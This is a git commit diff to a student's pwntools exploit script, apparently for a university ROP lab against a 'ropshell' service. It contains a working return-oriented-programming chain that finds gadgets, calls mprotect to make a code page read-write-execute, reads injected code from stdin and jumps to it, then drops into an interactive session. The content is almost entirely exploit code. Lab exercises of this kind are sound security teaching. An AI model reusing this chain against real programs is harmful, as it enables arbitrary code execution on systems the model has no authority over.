e645609f7f42c08a55f008368eb66a63f6467d40
yoonaiu <free.cs09@nycu.edu.tw>
2023-05-12 10:27:11 +0800

    p64 -> flat

--- lab7/submit.py
+++ lab7/submit.py
@@ -7,10 +7,12 @@ import pow as pw
 from pwn import *
 # import asm
 from pwn import asm
+from pwnlib.util.packing import flat
 import sys
 
 context.arch = 'amd64'
 context.os = 'linux'
+context.terminal = ['tmux', 'splitw', '-h']
 
 remote = False
 code_bytes = b''
@@ -69,44 +71,168 @@ def code_bytes_find(target_asm):
     if pos == -1:
         print("not found alert: ", target_asm)
     else:
-        print("pos: ", hex(pos))
+        # print("pos: ", hex(pos))
+        pass
     return pos
 
 def task1_byte():
     global start_code_address
 
-    send_line = b''.join([
-        p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
-        p64(60),
-        p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
-        p64(37),
-        p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
-    ])
+    # send_line = b''.join([
+    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
+    #     p64(60),
+    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
+    #     p64(37),
+    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
+    # ])
+    # print("send_line\n", send_line)
+
+    send_line = flat(
+        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        60,
+        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        37,
+        code_bytes_find(asm("syscall\nret")) + start_code_address,
+        endianness = 'little'
+    )
+    print("send_line\n", send_line)
 
     return send_line
 
 def mprotect_byte():
     global start_code_address
+    mprotect_address = start_code_address & ~(0xfff)  # use the align address
+    print("start_code_address: ", hex(start_code_address))
+    print("mprotect_address: ", hex(mprotect_address))
 
-    # open memory = codeint to be able to read & write & execute
+    # 1. open memory = codeint to be able to read & write & execute
+    # 2. read user input
     # ropshell will clean the register before executing
 
-    send_line = b''.join([
+    # send_line = b''.join([
+    #     # al is rax's LSB 8 bits, 0xa is 10, mprotect syscall number
+    #     # rax to place syscall number
+    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
+    #     p64(10),
+    #     # rdi - page start
+    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
+    #     p64(mprotect_address),
+    #     # rsi - page len
+    #     p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
+    #     # p64(10*0x10000),
+    #     p64(40960),
+    #     # rdx - dl is LSB 8 bits, open mode -> read(0x1), write(0x2), exec(0x4) -(all or)-> 0x7
+    #     p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
+    #     p64(7),
+    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
+
+    #     # write syscall
+    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
+    #     p64(1),
+    #     # fd (stdout)
+    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
+    #     p64(1),
+    #     # buf addr
+    #     p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
+    #     p64(start_code_address),
+    #     # len
+    #     p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
+    #     p64(50),
+    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
+
+    #     # read user input
+    #     # read syscall
+    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
+    #     p64(0),
+    #     # fd (stdin)
+    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
+    #     p64(0),
+    #     # buf addr
+    #     p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
+    #     p64(start_code_address),
+    #     # len
+    #     p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
+    #     p64(4096),
+    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
+
+    #     # write syscall
+    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
+    #     p64(1),
+    #     # fd (stdout)
+    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
+    #     p64(1),
+    #     # buf addr
+    #     p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
+    #     p64(start_code_address),
+    #     # len
+    #     p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
+    #     p64(50),
+    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
+
+    #     # go to execute the code here
+    #     p64(start_code_address),
+    # ])
+
+    send_line = flat(
         # al is rax's LSB 8 bits, 0xa is 10, mprotect syscall number
         # rax to place syscall number
-        p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
-        p64(10),
+        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        10,
         # rdi - page start
-        p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
-        p64(start_code_address),
+        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        mprotect_address,
         # rsi - page len
-        p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
-        p64(4096),
+        code_bytes_find(asm("pop rsi\nret")) + start_code_address,
+        40960,
         # rdx - dl is LSB 8 bits, open mode -> read(0x1), write(0x2), exec(0x4) -(all or)-> 0x7
-        p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
-        p64(7),
-        p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
-    ])
+        code_bytes_find(asm("pop rdx\nret")) + start_code_address,
+        7,
+        code_bytes_find(asm("syscall\nret")) + start_code_address,
+
+        # write syscall
+        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        1,
+        # fd (stdout)
+        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        1,
+        # buf addr
+        code_bytes_find(asm("pop rsi\nret")) + start_code_address,
+        start_code_address,
+        # len
+        code_bytes_find(asm("pop rdx\nret")) + start_code_address,
+        50,
+        code_bytes_find(asm("syscall\nret")) + start_code_address,
+
+        # read user input
+        # read syscall
+        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        0,
+        # fd (stdin)
+        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        0,
+        # buf addr
+        code_bytes_find(asm("pop rsi\nret")) + start_code_address,
+        start_code_address,
+        # len
+        code_bytes_find(asm("pop rdx\nret")) + start_code_address,
+        4096,
+        code_bytes_find(asm("syscall\nret")) + start_code_address,
+        # write syscall
+        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        1,
+        # fd (stdout)
+        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        1,
+        # buf addr
+        code_bytes_find(asm("pop rsi\nret")) + start_code_address,
+        start_code_address,
+        # len
+        code_bytes_find(asm("pop rdx\nret")) + start_code_address,
+        50,
+        code_bytes_find(asm("syscall\nret")) + start_code_address,
+        # go to execute the code here
+        start_code_address,
+    )
 
     return send_line
 
@@ -116,7 +242,8 @@ if __name__ == '__main__':
     if 'qemu' in sys.argv[1:]:
         r = process("qemu-x86_64-static ./ropshell", shell=True)
     elif 'bin' in sys.argv[1:]:
-        r = process("./ropshell", shell=False)
+        # r = process("./ropshell", shell=False)
+        r = process("./server", shell=False)  # my server
     elif 'local' in sys.argv[1:]:
         r = remote("localhost", 10494)
     else:
@@ -126,15 +253,41 @@ if __name__ == '__main__':
     if type(r) != pwnlib.tubes.process.process:
         pw.solve_pow(r)
 
+    # gdb.attach(r)
+
     # find target asm
     get_init_info()
     if start_code_address == None or timestamp == None:
         exit(0)
 
     gen_random_code_bytes()
-    # send_line = task1_byte()
+    send_line = task1_byte()
+    # [first send]
     send_line = mprotect_byte()
-    print("send_line: ", send_line)
+    # send_line += task1_byte()
+    # print("send_line_1: ", send_line)
     
     r.send(send_line)
+
+    # send shell code -> normal exit
+    # [second send] 
+    print("bytes command received output: ", r.recvuntil("bytes command received.\n", drop=False).decode())
+
+    # 1st write codeint output
+    print(r.recv())
+
+    send_line_2 = task1_byte()
+    print("send_line_2 to read: ", send_line_2)
+    r.send(send_line_2)
+
+    # 2nd write codeint output
+    print(r.recv())
+
+    print("after send 2")
+
+    # print(r.recvline().decode())
+    # print(r.recvline().decode())    
+    # print(r.recvline().decode())    
+
+    # 2nd write codeint output
     r.interactive()
